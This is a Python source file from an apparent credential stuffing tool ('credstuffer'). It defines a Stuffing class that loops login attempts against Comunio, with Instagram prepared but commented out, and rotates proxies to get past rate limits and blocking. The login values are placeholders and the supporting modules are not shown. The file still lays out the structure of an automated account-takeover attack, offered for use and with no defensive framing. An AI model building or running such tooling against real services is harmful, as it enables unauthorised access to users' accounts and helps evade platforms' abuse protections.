import logging
from credstuffer import UserAccount
from credstuffer.logins import Comunio, Instagram, Facebook
from credstuffer.proxy import Proxy
from credstuffer.exceptions import ProxyMaxRequestError


class Stuffing:
    """ class Stuffing to execute the credential stuffing algorithm

    USAGE:
            stuffing = Stuffing()

    """
    def __init__(self):
        self.logger = logging.getLogger('credstuffer')
        self.logger.info('create class Stuffing')

        self.accounts = []
        # create account instances
        self.comunio = Comunio()
        self.instagram = Instagram()
        self.accounts.append(self.comunio)
        #self.accounts.append(self.instagram)

        self.proxy = Proxy(timeout_ms=50)
        self.http_str = 'http://'
        self.https_str = 'https://'

    def get_proxy_dict(self):
        """

        :return:
        """
        proxy = self.proxy.get()
        http_proxy = self.http_str + proxy
        https_proxy = self.https_str + proxy
        print(http_proxy)
        return {'http': http_proxy,
                'https': https_proxy}

    def run(self):
        """

        :return:
        """

        for account in self.accounts:
            try:
                # handle user accounts
                if isinstance(account, UserAccount):
                    account.set_proxy(proxy=self.get_proxy_dict())
                    response = account.login('bierschi', 'test')
                    while response is None:
                        account.set_proxy(proxy=self.get_proxy_dict())
                        response = account.login('bierschi', 'test')
                    print(response.status_code)
                    print(response.text)

                # handle email accounts
                else:
                    response = account.login('bierschi', 'test')
            except ProxyMaxRequestError:
                print("need new Proxy")

if __name__ == '__main__':
    stuf = Stuffing()
    stuf.run()
